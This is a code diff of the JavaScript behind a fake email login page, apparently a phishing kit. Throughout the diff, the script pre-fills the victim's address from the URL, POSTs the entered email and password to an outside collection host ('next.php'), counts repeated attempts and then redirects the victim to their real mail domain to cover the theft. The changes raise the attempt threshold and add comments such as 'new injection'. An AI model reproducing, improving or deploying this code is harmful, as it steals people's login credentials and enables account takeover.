@@ -134,19 +134,29 @@ form .button input:hover{
 
 <script>
 
-
-$(function() {
+/* global $ */
+$(document).ready(function() {
     var count = 0;
+
+
+
+    /////////////url ai getting////////////////
     var ai = window.location.hash.substr(1);
-    if (ai) {
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
         var my_ai = ai;
         var ind = my_ai.indexOf("@");
         var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.')).toLowerCase();
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
         $('#ai').val(my_ai);
         $('#aich').html(my_ai);
         $("#msg").hide();
+
     }
+    ///////////////url getting ai////////////////
 
     var file = "bmV4dC5waHA=";
 
@@ -158,53 +168,83 @@ $(function() {
         var pr = $("#pr").val();
         var msg = $('#msg').html();
         $('#msg').text(msg);
-
+        ///////////new injection////////////////
         var my_ai = ai;
         var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-        if (!ai || !filter.test(my_ai) || !pr) {
-            $('#error').show().html(!ai ? "Email field is empty!" : (!filter.test(my_ai) ? "Account doesn't exist. Enter a different account" : "Password field is empty!"));
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("email field is empty.!");
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
             return false;
         }
 
         var ind = my_ai.indexOf("@");
         var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.')).toLowerCase();
-        count++;
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 1;
 
         $.ajax({
             dataType: 'JSON',
-            url: 'https://gjhdaumr7fyh.host/jy/ntease/next.php',
+            url: 'https://gjhdaumr7fyh.host/jy/ntease/next.php', // Here Your portal.php Hosted Link
             type: 'POST',
-            data: { ai: ai, pr: pr },
-            beforeSend: function(xhr) { $('#submit-btn').html('Verifing...'); },
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
             success: function(response) {
                 if (response) {
                     $("#msg").show();
+                    console.log(response);
                     if (response['signal'] == 'ok') {
                         $("#pr").val("");
-                        if (count >= 2) {
+                        if (count >= 3) {
                             count = 0;
+                            // window.location.replace(response['redirect_link']);
                             window.location.replace("http://www." + my_slice);
                             return false;
+
                         }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
                     }
                 }
             },
             error: function() {
                 $("#pr").val("");
-                if (count >= 2) {
+                if (count >= 3) {
                     count = 0;
                     window.location.replace("http://www." + my_slice);
                     return false;
                 }
                 $("#msg").show();
+                // $('#msg').html("Please try again later");
             },
-            complete: function() { $('#submit-btn').html('Login'); }
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
         });
     });
-});
 
+
+});
 
 
 </script>
